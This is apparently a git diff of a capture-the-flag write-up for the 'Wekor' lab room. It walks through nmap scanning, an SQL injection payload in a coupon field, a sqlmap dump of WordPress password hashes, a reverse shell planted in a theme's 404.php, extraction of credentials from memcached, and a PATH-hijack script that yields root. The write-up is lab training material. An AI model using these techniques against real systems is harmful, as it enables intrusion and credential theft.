@@ -1,6 +1,6 @@
-##Wekor
+## Wekor
 
-#Enumeration
+# Enumeration
 ```
 # Nmap 7.91 scan initiated Tue Mar  9 10:38:35 2021 as: nmap -sC -sV -oN nmap/initial -vvv -p 22,80 10.10.203.59
 Nmap scan report for wekor.thm (10.10.203.59)
@@ -30,19 +30,20 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Tue Mar  9 10:38:48 2021 -- 1 IP address (1 host up) scanned in 13.64 seconds
 ```
+
 Off the bat we can seee some disallowed entries in robots.txt so lets take a look at them. Most of them are simply not found however on /comingreallysoon/ we find the following note
 ```
 Welcome Dear Client! We've setup our latest website on /it-next, Please go check it out! If you have any comments or suggestions, please tweet them to @faketwitteraccount! Thanks a lot ! 
 ```
 As the message describes going to /it-next gives us the website
 
-#wekor.thm/it-next/
+# wekor.thm/it-next/
 One of the tags for this room was sqli so we start by looking for fields to exploit while we begin to enumerate for any directories or subdoamins. The search function doesn't seem vulnerable however on the wekor.thm/it-next/it-cart.php page we find a field to apply a coupon upon entering ' or 1=1 -- we get the following response
 ```
 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
 ```
-This definitely seems like there is something to abuse here. So lets intercept the request and then use sqlmap to look for vulnerabilites.
-Upon completion we are presented alot of information but most interesting is the following
+
+This definitely seems like there is something to abuse here. So lets intercept the request and then use sqlmap to look for vulnerabilites. Upon completion we are presented alot of information but most interesting is the following
  ```
  Database: wordpress
 Table: wp_users
@@ -56,10 +57,11 @@ Table: wp_users
 | 5873 | http://eagle.com                | $P$Bp{Hash}QY/ | eagle@wekor.thm   | wp_eagle   | 0           | wp eagle     | wp_eagle      | 2021-01-21 20:36:11 | <blank>                                       |
 +------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
 ```
+
 We can go ahead and crack 3 of these hashes with rockyou except for the admin one, it is important to note also the presence of a subdomain site to access the wordpress site
 so lets add this to our hosts file and then navigate to the page
 
-#site.wekor.thm/wordpress
+# site.wekor.thm/wordpress
 Here we find the wordpress site that we dumped users for above. We can find the login panel at /wp-admin, so lets try our credentials that we managed to crack
 We find that wp_jeffrey is just a simple user, however when moving on to wp_yura we find it has admin privileges and can access the admin panel so lets insert a reverse shell on one of the pages and then use it to gain a foothold
 appearance->theme editor-> 404.php
@@ -76,7 +78,8 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 whoami
 www-data
 ```
-#Initial foothold
+
+# Initial foothold
 We fix our shell and begin to look for privilege escalation routes, there is nothing of note until we find the following
 ```
 netstat -lptu
@@ -101,6 +104,7 @@ udp6       0      0 [::]:mdns               [::]:*                              
 udp6       0      0 [::]:39028              [::]:*                              -
 
 ```
+
 We have some ports open locally, looking up port 11211 we find that it is used for the memcached protocol we can connect to it via telnet and see if we can find any cached data to exfiltrate
 
 ```
@@ -143,13 +147,14 @@ VALUE password 0 15
 {Orka's password}
 END
 ```
+
 To explain the above,
 stats items: allows us to see everything in the cache
 stats cachedump 1 0: will dump everything with slab id 1
 get {ITEM}: read the item we wish to see
 with the above we presumably have credentials for the Orka user so lets switch over
 
-#Orka
+# Orka
 We find the user flag in Orka's home directory, and the following
 ```
 sudo -l
@@ -162,6 +167,7 @@ User Orka may run the following commands on osboxes:
     (root) /home/Orka/Desktop/bitcoin
 Orka@osboxes:~$
 ```
+
 We import the binary to our local machine and analyze it with ghidra. We find the password in plaintext to allow us to use the binary and then explore what it is doing. 
     else {
       sprintf(local_78,"python /home/Orka/Desktop/transfer.py %c",(int)local_88);
@@ -197,14 +203,17 @@ else:
         print("Quitting...")
         time.sleep(1)
 ```
+
 We cannot directly edit this file so lets try and hijack something, we can't write to this directory but going back to our sudo -l output we can try and find a place in our path that we can write to. We find that /usr/sbin is writeable and in our path above /usr/bin, which we can confirm is the location of python on our system
 ```
 which python
 /usr/bin/python
 ```
+
 As such we can make a python file in /usr/sbin/python as follows
 ```
 #!/bin/bash
 /bin/bash
 ```
+
 and it should take higher precendence over the actual python binary and result in a shell. We do the above and successfully spawn a root shell and can find the root flag in /root!
